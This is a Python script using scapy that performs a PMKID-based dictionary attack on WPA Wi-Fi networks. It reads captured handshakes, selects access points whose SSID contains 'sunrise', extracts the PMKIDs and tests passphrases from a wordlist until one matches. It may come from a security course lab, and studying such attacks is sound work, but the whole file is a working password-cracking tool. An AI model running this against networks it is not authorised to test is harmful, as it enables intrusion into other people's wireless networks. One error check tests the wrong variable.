import hashlib
import hmac
from binascii import b2a_hex

from pbkdf2 import *
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11FCS


def get_bssids(packets, ssid):
    """
    Retrieve all BSSIDs of APs broadcasting an SSID containing the given `ssid'.
    :param packets: a list of packets in which to search the BSSIDs
    :param ssid: a partial SSID
    :return: a dictionary with the found BSSIDs as keys and as values a set of corresponding SSID
    """
    bssids = {}
    for p in packets:
        if p.haslayer(Dot11Beacon):
            complete_ssid = p[Dot11Elt][0].info
            if ssid.lower() in complete_ssid.lower():
                bssid = p[Dot11FCS].addr2
                if bssid not in bssids:
                    bssids[bssid] = set()
                bssids[bssid].add(complete_ssid)
    return bssids


def get_pmkids(packets, bssids):
    """
    Retrieve the PMKIDs of an AP with the given `bssid'.
    :param packets: a list of packets in which to search the PMKID
    :param bssid: the AP's BSSID
    :return: a set of tuples composed of the PMKID, the corresponding BSSID and STA MAC address
    """
    pmkids = set()
    for p in packets:
        if p.haslayer(EAPOL) and p[Dot11FCS].addr2 in bssids:
            pmkids.add((p[Raw].load[-16:], p[Dot11FCS].addr2, p[Dot11FCS].addr1))
    return pmkids


def compute_pmkid(passphrase, ssid, bssid, sta_mac):
    """
    Compute the PMKID for the given passphrase, BSSID and STA MAC address.
    :param passphrase: the passphrase
    :param bssid: the AP's BSSID
    :param sta_mac: the STA MAC address
    :return:
    """
    pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), ssid, 4096, 32)
    data = b'PMK Name' + mac2str(bssid) + mac2str(sta_mac)
    return hmac.new(pmk, data, hashlib.sha1).digest()[:16]  # first 128 bits only


#
# Read capture file which contains multiple unsuccessful 4-way WPA handshakes.
packets = rdpcap('PMKID_handshake.pcap')

#
# Retrieve BSSIDs corresponding to a Sunrise AP.
bssids = get_bssids(packets, b'sunrise')
if len(bssids) == 0:
    print('No Sunrise AP found.')
    exit(-1)

print('\nSunrise APs found:')
print(bssids)

#
# Find PMKIDs for the Sunrise APs.
pmkids = get_pmkids(packets, bssids.keys())
if len(bssids) == 0:
    print('No PMKID found for the Sunrise AP.')
    exit(-1)

print('\nPMKIDs found for Sunrise APs:')
print(pmkids)

#
# Read dictionary of passphrases.
with open('dictionary.txt') as f:
    passphrases = f.read().splitlines()

#
# Compute the PMKID for each passphrase and BSSID/STA combinations, and compare the result to see if a computed PMKID
# matches one of the captured PMKIDs.
print('\nComputing PMKIDs…')
for passphrase in passphrases:
    for pmkid, bssid, sta_mac in pmkids:
        for ssid in bssids[bssid]:  # overkill but apparently we can have multiple SSIDs per BSSID
            if pmkid == compute_pmkid(passphrase, ssid, bssid, sta_mac):
                print('Passphrase for PMKID {} is {} (SSID: {}, BSSID: {}, STA: {})'
                      .format(b2a_hex(pmkid).decode(), passphrase, ssid.decode(), bssid, sta_mac))
